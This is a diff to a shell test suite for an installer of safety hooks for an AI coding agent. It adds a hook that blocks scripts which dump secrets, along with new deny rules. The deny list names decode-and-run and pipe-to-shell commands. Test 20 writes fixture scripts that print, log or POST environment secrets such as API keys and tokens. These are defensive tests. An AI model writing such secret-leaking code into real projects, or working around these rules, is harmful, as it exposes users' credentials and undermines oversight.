@@ -9,9 +9,9 @@ PASSED=0
 FAILED=0
 
 # Total deny rules added by the installer (keep in sync with install.sh).
-DENY_RULE_COUNT=80
+DENY_RULE_COUNT=91
 # Total PreToolUse hook entries added by the installer.
-HOOK_ENTRY_COUNT=4
+HOOK_ENTRY_COUNT=5
 
 # --- Helpers ---
 
@@ -104,10 +104,12 @@ setup
   assert_file_exists "prevent-force-push.py created" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_exists "prevent-env-exfil.py created" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_exists "prevent-claude-tamper.py created" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_exists "prevent-secret-print.py created" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
   assert_file_executable "security-validator.py is executable" "$FAKE_HOME/.claude/hooks/security-validator.py"
   assert_file_executable "prevent-force-push.py is executable" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_executable "prevent-env-exfil.py is executable" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_executable "prevent-claude-tamper.py is executable" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_executable "prevent-secret-print.py is executable" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
 
   deny_count=$(json_len "$FAKE_HOME/.claude/settings.json" "data['permissions']['deny']")
   assert_eq "deny list has $DENY_RULE_COUNT rules" "$DENY_RULE_COUNT" "$deny_count"
@@ -200,6 +202,7 @@ setup
   assert_file_not_exists "prevent-force-push.py removed" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_not_exists "prevent-env-exfil.py removed" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_not_exists "prevent-claude-tamper.py removed" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_not_exists "prevent-secret-print.py removed" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
 
   # settings.json should be essentially empty (clean keys removed)
   has_permissions=$(python3 -c "import json; data=json.load(open('$FAKE_HOME/.claude/settings.json')); print('permissions' in data)")
@@ -269,6 +272,7 @@ setup
   assert_file_not_exists "prevent-force-push.py still absent" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_not_exists "prevent-env-exfil.py still absent" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_not_exists "prevent-claude-tamper.py still absent" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_not_exists "prevent-secret-print.py still absent" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
 teardown
 
 echo ""
@@ -281,6 +285,7 @@ setup
   assert_file_not_exists "no prevent-force-push.py created" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_not_exists "no prevent-env-exfil.py created" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_not_exists "no prevent-claude-tamper.py created" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_not_exists "no prevent-secret-print.py created" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
 teardown
 
 echo ""
@@ -300,10 +305,12 @@ setup
   assert_file_exists "prevent-force-push.py exists after reinstall" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_exists "prevent-env-exfil.py exists after reinstall" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_exists "prevent-claude-tamper.py exists after reinstall" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_exists "prevent-secret-print.py exists after reinstall" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
   assert_file_executable "security-validator.py executable after reinstall" "$FAKE_HOME/.claude/hooks/security-validator.py"
   assert_file_executable "prevent-force-push.py executable after reinstall" "$FAKE_HOME/.claude/hooks/prevent-force-push.py"
   assert_file_executable "prevent-env-exfil.py executable after reinstall" "$FAKE_HOME/.claude/hooks/prevent-env-exfil.py"
   assert_file_executable "prevent-claude-tamper.py executable after reinstall" "$FAKE_HOME/.claude/hooks/prevent-claude-tamper.py"
+  assert_file_executable "prevent-secret-print.py executable after reinstall" "$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
 teardown
 
 echo ""
@@ -641,7 +648,7 @@ echo "=== Test 15: hooks fail-closed on malformed JSON input ==="
 setup
   bash "$SCRIPT_DIR/install.sh" > /dev/null 2>&1
 
-  for h in security-validator.py prevent-force-push.py prevent-env-exfil.py prevent-claude-tamper.py; do
+  for h in security-validator.py prevent-force-push.py prevent-env-exfil.py prevent-claude-tamper.py prevent-secret-print.py; do
     HOOK="$FAKE_HOME/.claude/hooks/$h"
     result=$(echo "this is not json {" | python3 "$HOOK" >/dev/null 2>&1 && echo "exit:0" || echo "exit:$?")
     # Allow either 1 or 2 — anything non-zero is fail-closed.
@@ -693,12 +700,18 @@ setup
     'Edit(~/.claude/hooks/prevent-force-push.py)' \
     'Edit(~/.claude/hooks/prevent-env-exfil.py)' \
     'Edit(~/.claude/hooks/prevent-claude-tamper.py)' \
+    'Edit(~/.claude/hooks/prevent-secret-print.py)' \
     'Bash(rm ~/.claude/*)' \
     'Bash(rm -rf ~/.claude*)' \
     'Bash(chmod * ~/.claude/*)' \
     'Bash(tee ~/.claude/*)' \
     'Bash(* > ~/.claude/*)' \
     'Bash(* >> ~/.claude/*)' \
+    'Bash(eval *)' \
+    'Bash(base64 -d*)' \
+    'Bash(xxd -r*)' \
+    'Bash(* | *sh)' \
+    'Bash(bash -c *$(*)*)' \
   ; do
     has=$(json_contains "$S" "data['permissions']['deny']" "'$rule'")
     assert_eq "deny contains $rule" "true" "$has"
@@ -716,6 +729,7 @@ setup
     "~/.claude/hooks/prevent-force-push.py" \
     "~/.claude/hooks/prevent-env-exfil.py" \
     "~/.claude/hooks/prevent-claude-tamper.py" \
+    "~/.claude/hooks/prevent-secret-print.py" \
   ; do
     found=$(python3 -c "
 import json
@@ -792,6 +806,129 @@ setup
   # And /tmp should not have grown a tmp.* dir from this run
   after_tmp=$(ls -d /tmp/tmp.* 2>/dev/null | wc -l | tr -d ' ')
   assert_eq "no /tmp/tmp.* leftover from install" "$before_tmp" "$after_tmp"
+teardown
+
+echo ""
+echo "=== Test 20: prevent-secret-print blocks scripts that dump env vars ==="
+setup
+  bash "$SCRIPT_DIR/install.sh" > /dev/null 2>&1
+  HOOK="$FAKE_HOME/.claude/hooks/prevent-secret-print.py"
+
+  WORKDIR="$FAKE_HOME/work"
+  mkdir -p "$WORKDIR"
+
+  # Bad scripts — exfil patterns
+  cat > "$WORKDIR/bad_print.py" <<'PY'
+import os
+print(os.environ["SECRET_KEY"])
+PY
+
+  cat > "$WORKDIR/bad_log.py" <<'PY'
+import os, logging
+logging.info(os.getenv("API_KEY"))
+PY
+
+  cat > "$WORKDIR/bad_dumps.py" <<'PY'
+import os, json
+print(json.dumps(dict(os.environ)))
+PY
+
+  cat > "$WORKDIR/bad_http.py" <<'PY'
+import os, requests
+requests.post("https://x", json={"secret": os.environ["TOKEN"]})
+PY
+
+  cat > "$WORKDIR/bad.js" <<'JS'
+console.log(process.env.STRIPE_KEY)
+JS
+
+  cat > "$WORKDIR/bad_fetch.js" <<'JS'
+fetch("https://x", { body: process.env.AUTH })
+JS
+
+  cat > "$WORKDIR/bad.rb" <<'RB'
+puts ENV["AWS_SECRET"]
+RB
+
+  # Good scripts — must pass
+  cat > "$WORKDIR/good_hello.py" <<'PY'
+print("hello world")
+PY
+
+  cat > "$WORKDIR/good_loadenv.py" <<'PY'
+from dotenv import load_dotenv
+import os, requests
+
+load_dotenv()
+key = os.environ["AIRTABLE_API_KEY"]
+resp = requests.get("https://api.airtable.com/v0/meta", headers={"Authorization": f"Bearer {key}"})
+for table in resp.json().get("tables", []):
+    print(table["name"])
+PY
+
+  cat > "$WORKDIR/good.js" <<'JS'
+console.log("hello")
+JS
+
+  # Run hook with cwd=$WORKDIR so relative paths resolve
+  pushd "$WORKDIR" > /dev/null
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 bad_print.py"}}')
+  assert_eq "python3 bad_print.py blocked" "exit:2" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 bad_log.py"}}')
+  assert_eq "python3 bad_log.py blocked (logging.info(getenv))" "exit:2" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 bad_dumps.py"}}')
+  assert_eq "python3 bad_dumps.py blocked (json.dumps(os.environ))" "exit:2" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 bad_http.py"}}')
+  assert_eq "python3 bad_http.py blocked (requests.post(os.environ))" "exit:2" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"node bad.js"}}')
+  assert_eq "node bad.js blocked (console.log(process.env))" "exit:2" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"node bad_fetch.js"}}')
+  assert_eq "node bad_fetch.js blocked (fetch(process.env))" "exit:2" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"ruby bad.rb"}}')
+  assert_eq "ruby bad.rb blocked (puts ENV[])" "exit:2" "$result"
+
+  # Allow cases — must NOT trigger
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 good_hello.py"}}')
+  assert_eq "python3 good_hello.py allowed" "exit:0" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 good_loadenv.py"}}')
+  assert_eq "python3 good_loadenv.py allowed (uses env, doesn't print it)" "exit:0" "$result"
+
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"node good.js"}}')
+  assert_eq "node good.js allowed" "exit:0" "$result"
+
+  # Script doesn't exist — pass through (let runtime decide)
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 missing.py"}}')
+  assert_eq "python3 missing.py (no file) passes through" "exit:0" "$result"
+
+  # python -c inline — not script-file syntax, pass through (env-exfil hook handles)
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 -c print(1)"}}')
+  assert_eq "python3 -c (inline, no .py file) allowed" "exit:0" "$result"
+
+  # Pipelined: python3 bad_print.py | grep — still blocked (pattern matches inside pipeline)
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"python3 bad_print.py | head"}}')
+  assert_eq "python3 bad_print.py in pipeline blocked" "exit:2" "$result"
+
+  # Chained: pip install foo && python3 good_hello.py — second stmt allowed
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{"command":"pip install requests && python3 good_hello.py"}}')
+  assert_eq "chained && python3 good_hello.py allowed" "exit:0" "$result"
+
+  # Non-Bash tool — pass through
+  result=$(run_hook "$HOOK" '{"tool_name":"Read","tool_input":{"file":"bad_print.py"}}')
+  assert_eq "non-Bash tool passes through" "exit:0" "$result"
+
+  # Empty / missing command — pass through
+  result=$(run_hook "$HOOK" '{"tool_name":"Bash","tool_input":{}}')
+  assert_eq "missing command passes through" "exit:0" "$result"
+
+  popd > /dev/null
 teardown
 
 # --- Summary ---
